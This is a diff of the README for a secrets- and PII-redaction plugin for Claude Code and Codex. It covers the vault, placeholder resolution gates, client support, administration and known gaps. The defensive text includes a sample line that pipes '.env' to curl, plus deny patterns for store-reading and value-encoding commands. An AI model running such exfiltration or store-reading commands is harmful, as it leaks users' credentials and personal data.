@@ -7,7 +7,10 @@ Keeps secrets and PII out of the cloud model. Works as a plugin for Claude Code
 
 **What it does, deterministically and locally:**
 
-1. **You type a secret or a customer address.** A `UserPromptSubmit` hook
+1. **You type a secret or a personal value** (a token, a password after a
+   label, any e-mail address, a phone number with a country code, an IBAN, a
+   card number, a public IP, and German identifiers by default). A
+   `UserPromptSubmit` hook
    detects it, stores it in a local vault, blocks the prompt, and keeps the
    rewritten prompt with a placeholder such as `⟦SECRET_c1⟧` or
    `⟦EMAIL_c1:ma•••@example.org⟧`. Type `/maisecrets:send` to send it as is,
@@ -21,7 +24,12 @@ Keeps secrets and PII out of the cloud model. Works as a plugin for Claude Code
    output is redacted again on the way back. See "Gates around a resolve".
 
 Everything a hook runs is readable source in this folder. No download, no
-package install, no dependency outside the Python standard library.
+package install, no dependency outside the Python standard library and the
+system tools it names (`security`, PowerShell, `openssl`, a clipboard tool).
+
+What it does not do: detect names, follow a value through an encoding a
+command applies, or protect against a process that runs as you. "Known gaps"
+below lists every limit that was measured.
 
 ## What it looks like
 
@@ -73,22 +81,24 @@ a feature or a fix bumps the last number). Vault backend per platform:
 | Linux | `encrypted-file` | `openssl` AES-256-CBC + PBKDF2 + HMAC tag, key file 0600 |
 | any | `jsonfile` | plaintext 0600, TEST MODE only |
 
-Hooks run through `hooks/run.sh` (bash), which picks `python3`, `python` or
-`py -3`. Claude Code on Windows requires Git Bash, so the launcher runs there
-too. Codex on Windows has no Git Bash, so every hook also names a
-`commandWindows` entry: `hooks/run.cmd` runs the same `dispatch.py` from
-`cmd.exe`, the shell Codex uses for a Windows hook, with the payload untouched. Install Python with
-`winget install Python.Python.3.12`. Without a Python 3.11+ either launcher
-exits 2 and prompts are blocked: fail closed.
+Hooks run through `hooks/run.sh` (bash), which looks for a Python 3.11+ as
+`python3`, `python`, `py -3`, a versioned name, or the Homebrew, `/usr/local`
+and python.org paths. Claude Code on Windows requires Git Bash, so the
+launcher runs there too. Codex on Windows has no Git Bash, so every hook also
+names a `commandWindows` entry: `hooks/run.cmd` runs the same `dispatch.py`
+from `cmd.exe`, the shell Codex uses for a Windows hook. Without a Python
+3.11+ the launcher blocks every prompt and every tool call and withholds every
+tool result, and its message names what to install: fail closed, with a cause.
 
 Proven with the harness on macOS (Claude Code 2.1.283) and on Debian 13
-(2.1.223), 6 scenarios each, version 0.3.5; Windows through the GitHub Actions matrix
-(unit tests, launcher, Credential Locker round trip), not yet with a live
-Claude Code session. Codex (codex-cli 0.155.1): the same `hooks/hooks.json`
-works unchanged, Codex sets `CLAUDE_PLUGIN_ROOT` itself; `harness/codex.py`
-proves the three tool scenarios against a fake Responses upstream and, with
-`--real`, against the real model (3 of 3 on 2026-09-26). `docs/TESTING.md`
-has the record.
+(2.1.223), 7 scenarios each, on every push in CI; Windows through the GitHub
+Actions matrix (unit tests, both launchers, Credential Locker round trip), not
+yet with a live Claude Code session. Codex (codex-cli 0.155.1): the same
+`hooks/hooks.json`, Codex sets `CLAUDE_PLUGIN_ROOT` itself; `harness/codex.py`
+proves the three tool scenarios against a fake Responses upstream on every
+push and, with `--real`, against the real model. `docs/TESTING.md` has the
+record. GitHub is a read-only mirror of the primary repository; issues and
+pull requests are welcome there.
 
 ## Client support
 
@@ -97,9 +107,11 @@ has the record.
 
 | client | prompt | rehydrate | redact | adapter |
 |---|:---:|:---:|:---:|---|
-| Claude Code, Cowork | ✅ | ✅ | ✅ | built |
-| Codex CLI, IDE extension, Codex in the ChatGPT desktop app | ✅ | ✅ | ✅ | built; hooks need one trust review per user (`/hooks`) unless an admin ships them as managed hooks; on Windows a shell placeholder is denied (PowerShell rewrite not built) |
-| Gemini CLI | ☑️ | ☑️ | ☑️ | not planned (successor: Antigravity) |
+| Claude Code CLI | ✅ | ✅ | ✅ | built |
+| Cowork, Claude desktop app | ☑️ | ☑️ | ☑️ | same hooks and manifest; not measured by the harness |
+| Codex CLI | ✅ | ✅ | ✅ | built; hooks need one trust review per user (`/hooks`) unless an admin ships them as managed hooks; on Windows a shell placeholder is denied (PowerShell rewrite not built) |
+| Codex IDE extension, Codex in the ChatGPT desktop app | ☑️ | ☑️ | ☑️ | same plugin runtime; not measured by the harness |
+| Gemini CLI | ☑️ | ☑️ | ☑️ | not planned |
 | Cursor | ☑️ | ☑️ | ⚠️ MCP only | waits for a shell-output hook |
 | Copilot CLI | ⚠️ SDK only | ☑️ | ☑️ | waits for a prompt hook |
 | OpenCode | ❌ | ☑️ | ☑️ | waits for a prompt hook |
@@ -111,6 +123,14 @@ value, resolve a placeholder at execution, redact tool output before the
 model sees it. A client with ❌ or ⚠️ under prompt or redact cannot be made
 safe by this plugin; it would look protected and leak. The hook names
 behind each mark are in `docs/CLIENTS.md`.
+
+## Requirements
+
+Python 3.11 or newer on the PATH the client gives its hooks (`python3 --version`).
+A stock Mac ships 3.9: `brew install python` or the python.org installer.
+Windows: `winget install Python.Python.3.12`. Linux: your package manager, plus
+`openssl` for the vault and `xclip` if you want the clipboard. Without it the
+plugin blocks every prompt and names the missing piece.
 
 ## Install
 
@@ -138,43 +158,95 @@ For development:
 
 ```bash
 claude --plugin-dir /path/to/maisecrets                 # one session, straight from the checkout
-python3 -m unittest discover -s tests -v               # 48 tests, under a second
-python3 harness/run.py                                 # 6 scenarios against a fake upstream
+python3 -m unittest discover -s tests -v               # under three seconds
+python3 harness/run.py                                 # 7 scenarios against a fake upstream
 python3 harness/codex.py [--real]                      # 3 scenarios through codex exec
 scripts/install-hooks.sh                               # git pre-commit / pre-push
 ```
 
-## Install (organisation, claude.ai)
+## Update and uninstall
 
-An organisation admin adds a **private** GitHub repository as a marketplace
-source under claude.ai organisation settings ("Sync from GitHub" lists private
-repositories only and needs the Claude GitHub App installed on it) and sets
-the availability (available, installed by default, or required). For this
-plugin that source is the private GitLab project itself, through a GitLab
-configuration with a read-only access token under Organization settings >
-Claude Code (public beta); the release pipeline tells the marketplace when
-main moved. Members never need access
-to the repository: organization sync packages the plugin. The public GitHub
-repository cannot be the organisation source (the sync accepts only private
-or internal marketplace repositories), but it may be referenced as a plugin
-source from a private one. Claude Code then offers the plugin to
-every member; a new version is picked up when the `version` in
-`.claude-plugin/plugin.json` changes, which the release job does on every
-merge to `main`. With `autoUpdate` on the marketplace entry the update lands
-at session start; otherwise `claude plugin update maisecrets@<marketplace>`.
+```bash
+claude plugin update maisecrets@maisecrets             # or a new session with an org-synced plugin
+claude plugin uninstall maisecrets@maisecrets
+codex plugin remove maisecrets@maisecrets
+```
+
+Uninstalling keeps the stored values until their TTL ends. To delete them,
+the metadata and the logs at once, run `maisecrets wipe --yes` from the plugin
+folder (`/maisecrets:status` prints the folder), or delete the `maisecrets`
+items in Keychain Access or Credential Manager and the `~/.maisecrets` folder.
+
+## For administrators
+
+**Rollout.** claude.ai: an organisation admin adds a private or internal
+marketplace repository under organisation settings and sets the availability
+(available, installed by default, required). The sync accepts no public
+repository, so create a private one with a `.claude-plugin/marketplace.json`
+that lists maisecrets with this repository as its source, or mirror this
+repository into a namespace you control and review each release there before
+your members get it. ChatGPT workspace: Admin > Plugins > Add > Import
+marketplace, with the same `marketplace.json`; the sync runs daily or on
+"Sync now". Codex CLI users trust the hooks once in `/hooks`; a change to
+`hooks/hooks.json` asks again, and until then Codex runs no maisecrets hook and
+says nothing. Managed hooks (`requirements.toml` through MDM) are trusted by
+policy.
+
+**Updates.** A new version reaches a member when `version` in
+`.claude-plugin/plugin.json` changes: at the next session start for an
+org-synced plugin, with `claude plugin update` otherwise. Every session starts
+with one line `maisecrets X.Y.Z active`; its absence means the plugin did not
+load. A rollback is a `git revert` on `main`: the pipeline releases it as the
+next patch version.
+
+**Settings you can enforce.** A machine policy file wins over the user's
+`~/.maisecrets/config.json` and cannot be changed from there:
+`/Library/Application Support/maisecrets/policy.json` (macOS),
+`%ProgramData%\maisecrets\policy.json` (Windows), `/etc/maisecrets/policy.json`
+(Linux). Any key from "Options" goes in it; typical: `backend`,
+`scrub_transcript`, `max_ttl_seconds`, `pii_regions`, `report_url`.
+`/maisecrets:status` names the keys that come from the policy. The plaintext
+`jsonfile` store is refused unless the policy or the user sets
+`allow_plaintext_store`.
+
+**What is written where.** `~/.maisecrets/index.json` holds metadata and keyed
+fingerprints, a masked display for PII, and session ids; metadata of an expired
+value is deleted after `keep_purged_days` (30). `audit.log` holds one line per
+resolve (time, session, key, tool, the command with placeholders; capped at
+`audit_max_lines`). `events.log` holds the last 200 detections (rule name and
+type). `pending/` holds a blocked prompt with placeholders for 15 minutes.
+`run/` holds the FIFOs a value is delivered through, for up to 120 s. The
+values live in the store of the platform. Nothing leaves the machine: no hook
+opens a network connection. Two exceptions to state to a data-protection
+officer: the Windows Credential Locker can roam through a Microsoft account on
+a machine that is not domain-joined (set `backend` to `encrypted-file` by
+policy if that matters), and `/maisecrets:report` opens the browser on a
+prefilled issue at `report_url` (set it to your tracker, or to `null` to turn
+reporting off).
+
+**Diagnosis.** `/maisecrets:status` prints version, plugin folder, Python,
+store, policy keys and log counts. `/maisecrets:audit` prints the last
+resolves. `MAISECRETS_DEBUG_LOG=<file>` in the client's environment records one
+line per hook call (event, client, duration, answer; never a value).
+`maisecrets wipe --yes` is the offboarding step.
 
 ## What the plugin runs, sends and fetches
 
-- Runs: `bash hooks/run.sh <event>` → `hooks/dispatch.py` on the matching
-  hook events. Each reads one JSON payload from stdin and prints one JSON
-  object. A granted Bash command runs `hooks/resolve.py` once.
-- Writes: `~/.maisecrets/index.json` (metadata and keyed fingerprints, never
-  a value), `~/.maisecrets/audit.log`, the vault backend, and, on a blocked
-  prompt, the clipboard. With `scrub_transcript`
-  on, it rewrites the raw prompt inside the Claude Code transcript file named
-  in the hook payload, because Claude Code writes the prompt to disk before
-  the hook runs.
-- Sends and fetches: nothing. No network access in any hook.
+- Runs: `bash hooks/run.sh <event>` (or `hooks/run.cmd` for Codex on Windows)
+  → `hooks/dispatch.py` on the matching hook events. Each reads one JSON
+  payload from stdin and prints one JSON object. A Bash command with a
+  placeholder reads the value from a FIFO in `~/.maisecrets/run` (POSIX) or
+  through `hooks/resolve.py` under a one-time grant (Windows Git Bash).
+- Writes: under `~/.maisecrets`: `index.json` (metadata and keyed
+  fingerprints, never a value), `audit.log`, `events.log`, `pending/`, `run/`,
+  `.announced`; the vault backend; on a blocked prompt the clipboard. With
+  `scrub_transcript` on, it masks the raw value inside the client's transcript
+  file named in the hook payload, in place, because the client writes the
+  prompt to disk before or after the hook runs. "For administrators" has the
+  retention of each file.
+- Sends and fetches: nothing. No hook opens a network connection.
+  `/maisecrets:report` opens your browser on a prefilled issue page; the
+  Windows Credential Locker may roam through a Microsoft account.
 
 ## Options
 
@@ -251,21 +323,32 @@ event, so it cannot be in the issue; describe its shape in words.
 
 A placeholder turns back into its value only here:
 
-- **In the session where a human typed it.** A reference minted in session A
-  resolves in session B only after you paste it into a prompt there. Keys are
-  counters, so an injected text could otherwise name one it never saw.
+- **In the session where the value came in.** A reference resolves in the
+  session where a human typed or pasted it, where the value was detected in a
+  prompt, or where the value appeared in a tool result. A reference minted in
+  session A resolves in session B only after you paste it into a prompt there.
+  Keys are counters, so an injected text could otherwise name one it never saw.
 - **Read up front in Bash.** The hook prefixes the command with
   `__ms_1="$(cat <fifo>)" || exit 97;` and turns `⟦SECRET_c1⟧` into
   `$__ms_1` in its quoting context. A detached process serves the value once
-  through a FIFO in the temp directory (readable from inside Codex's sandbox,
-  which can neither write the vault nor read the keychain); on Windows Git
-  Bash the resolver script reads it under a grant. The command you approve,
-  the transcript and the tool record carry no value. A missing delivery
-  ends the whole command with exit 97 before anything runs, also for
-  references inside pipelines and subshells; nothing ever runs with an empty
-  value. A FIFO path or a variable the model copies from the transcript into
-  a later command is denied. A value with quotes or `$(` arrives byte for
-  byte instead of becoming shell syntax.
+  through a FIFO in `~/.maisecrets/run` (a directory only you can enter;
+  readable from inside Codex's sandbox, which can neither write the vault nor
+  read the keychain); on Windows Git Bash the resolver script reads it under a
+  grant. The command you approve, the transcript and the tool record carry no
+  value. A missing delivery ends the whole command with exit 97 before
+  anything runs, also for references inside pipelines and subshells; nothing
+  ever runs with an empty value. Every key is checked before anything is
+  served, so a refused command leaves no value waiting. A value with quotes or
+  `$(` arrives byte for byte in the contexts the rewrite can prove: plain,
+  `'…'`, `"…"`, inside `$(…)`, an unquoted heredoc. A placeholder inside
+  another shell (`bash -c`, `ssh`, `eval`, `su -c`), a quoted heredoc, `$'…'`
+  or backticks, and a command that would encode, slice or trace the value
+  (`base64`, `xxd`, `${x:0:4}`, `set -x`, `PS4=`) are refused with the
+  reason, because there the value would be parsed a second time or leave in a
+  shape the redaction cannot see.
+- **Never in Write, Edit or a file.** A placeholder in Write/Edit is refused
+  with the reason: the file would get the literal text. Writing a value to
+  disk is a Bash command the user approves (`printf '%s' ⟦KEY⟧ > file`).
 - **Codex approves nothing here.** Codex accepts a rewritten command only
   together with `allow`, which skips its own approval prompt for that call.
   On Codex the gates above are the whole control; on Claude Code the normal
@@ -278,14 +361,17 @@ A placeholder turns back into its value only here:
   reason names the cap. Every resolve writes one line to `~/.maisecrets/audit.log`
   (time, session, key, tool, command with placeholders; never a value):
   `python3 -m maisecrets.cli audit`.
-- **Not by the agent reading the store.** A Bash command that calls
-  `maisecrets get`, `security … maisecrets` or reads the vault files is denied.
-  This is text matching, a backstop; the boundary is the grant.
+- **Not by the agent reading or changing the store.** A Bash command that
+  calls `maisecrets get`, `security … maisecrets`, names `~/.maisecrets` or a
+  delivery path, and a Write/Edit under `~/.maisecrets`, are denied and the
+  reason names the pattern. This is text matching, a backstop; the boundary
+  is the gates above, and a process that runs as you is not stopped by it.
 
 Recommended in your Claude Code settings, outside the plugin: the sandbox with
 `sandbox.credentials` deny for `.env` files and `~/.maisecrets`, and
-`injectHosts` for the hosts a value may go to. That closes `cat .env` and
-`printenv`, which no hook sees.
+`injectHosts` for the hosts a value may go to. That closes the paths no hook
+sees: a command that sends `.env` or `printenv` somewhere without printing it
+(`cat .env | curl -d @- …`). The hook redacts only what comes back.
 
 ## Detection rules
 
@@ -342,22 +428,40 @@ a to-do.
   `/hooks` that maisecrets is listed; the harness checks the debug log.
 - **A hook that exceeds the client's timeout fails open** (10 s for the
   prompt hook, 20 s for tool output, set in `hooks/hooks.json`). The plugin's
-  own watchdog answers fail-closed after 7 s (block, deny, or withheld
-  output), and a hook that crashes answers the same way; Claude Code ignores
-  exit 2 from `PostToolUse`, so the raw output would otherwise reach the
-  model. Codex runs the tool anyway when a hook fails, so there the watchdog
-  is the only net.
+  own watchdog answers fail-closed before that (7 s, 16 s for tool output:
+  block, deny, or withheld output), and a hook that crashes answers the same
+  way; Claude Code ignores exit 2 from `PostToolUse`, so the raw output would
+  otherwise reach the model. Codex runs the tool anyway when a hook fails, so
+  there the watchdog is the only net. A tool result with more than 100 new
+  values is masked without storing the rest.
 - **Tool output above 50K characters** is spilled to a file by Claude Code
   and is not rewritten.
 - **`@file` mentions** inline a file outside the hook pipeline. The prompt
   hook blocks them when the path exists; ask Claude to read the file instead.
 - **Names are not detected.** Regex only, by design.
-- **A transformed value passes.** Base64, split across lines, or a value with
-  spaces and quotes inside prose comes back unredacted; exact match works on
-  whole tokens and on the rest of a `KEY=value` line.
-- **Every store hands a value to any process of the same user.** The gates
-  stand in front of the agent, not in front of you; a Touch ID gate needs a
-  signed helper and is not built. See "Vault" and `docs/THREAT-MODEL.md`.
+- **A transformed value can pass.** For a value this session resolved, the
+  output is checked as a substring in plain, base64, hex, URL-encoded and
+  JSON-escaped form, and a resolving command may not encode it in the first
+  place. Every other live value is matched by whole token, by the pieces of a
+  URL or a `KEY=value` line, and by the rest of the line; a value split across
+  lines, or encoded by a command that carried no placeholder, comes back
+  unredacted. Values shorter than 8 characters are matched by shape only.
+- **Every store hands a value to any process of the same user**, and so does
+  a FIFO that waits for a granted command: another process of yours can read
+  it during the up to 120 s the command takes to start. The gates stand in
+  front of the agent, not in front of you; a Touch ID gate needs a signed
+  helper and is not built. See "Vault" and `docs/THREAT-MODEL.md`.
+- **Every e-mail address, phone number with a country code and public IP
+  counts**, also your own and your colleagues'. `git log`, `dig` and `ip addr`
+  come back with placeholders. Set `"pii_regions": ["generic"]` to drop the
+  German identifiers; there is no allow-list for single values yet.
+- **Placeholders resolve in Bash and MCP tool arguments only.** In Write, Edit,
+  WebFetch or a subagent prompt they stay text; Write/Edit with a placeholder
+  are refused with the reason. A subagent shares its parent's session; a
+  headless run (`codex exec`, `claude -p`) is a session of its own, so a
+  reference from an earlier run is foreign there.
+- **A reference in a prompt is admitted as typed by a human**, also when the
+  prompt was built from an issue body or a log in a headless run.
 - **Codex on Windows** runs commands in PowerShell, where the bash quoting
   contexts of the grant rewrite do not apply. The prompt block, the output
   redaction and the inline MCP resolve run through `hooks/run.cmd`; a
@@ -370,3 +474,4 @@ a to-do.
 
 Apache-2.0. `docs/PROTOCOL.md` is the specification a gateway implements,
 `docs/THREAT-MODEL.md` says what is defended, `docs/TESTING.md` what was measured.
+The licensor is named in `NOTICE`; the vendored rule sets carry their own licences.
